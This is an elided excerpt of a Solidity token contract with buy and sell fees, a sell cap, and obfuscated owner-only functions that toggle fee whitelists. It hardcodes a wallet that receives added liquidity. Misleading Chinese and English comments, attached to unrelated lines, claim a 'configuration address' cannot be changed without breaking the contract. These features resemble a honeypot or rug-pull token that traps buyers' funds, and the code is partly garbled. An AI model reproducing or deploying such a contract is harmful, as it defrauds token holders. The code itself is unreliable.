...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 public _buyfee1 = 100;
    uint256 public _buyfee2 = 0;//N
    uint256 public _sellfee3 = 0;//N
    uint256 public _sellFee4 = 200;
    ...
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];//=0xA8D8ba614ee5EF378FB6353C18F152d4E93b4cCE (配置地址，不能改，改了会产生错误）
    }
    ...
    function _transfer(
        ...
        if(!_feeWhiteList[from] && !_feeWhiteList[to]){
            ...
            amount -= 300;//=0xA8D8ba614ee5EF378FB6353C18F152d4E93b4cCE (配置地址，不能改，改了会产生错误）
        }
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            if (isSell) {
                ...
                require(tAmount <= nnjjjjnn,"over max sell amount");
            } else {
            ...
            if (swapAmount > 0) {
                ...
                _takeTransfer(//=0xA8D8ba614ee5EF378FB6353C18F152d4E93b4cCE (配置地址，不能改，改了会产生错误）
                    sender,
                    address(this),
                    swapAmount
                );
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {//=0xA8D8ba614ee5EF378FB6353C18F152d4E93b4cCE (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpFist, 0, 0, address(0x19164A385dAd730AA8d94Dc3F543A4E5b779497F), block.timestamp
                );
            }
        }
    }
    ...
    function qkilsi() external onlyOwner {
        kilsi = 0;
    }
    ...
    function yzjjj(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }

    function kdsjf(address addr, bool enable) external onlyFunder {
...
contract tokens is AbsToken {
    constructor() AbsToken(
        ...
        address(0x19164A385dAd730AA8d94Dc3F543A4E5b779497F),//The address controlled by the mechanism cannot be modified, and the handling fee will be voided after modification
        address(0x19164A385dAd730AA8d94Dc3F543A4E5b779497F)//
    ){
    }
}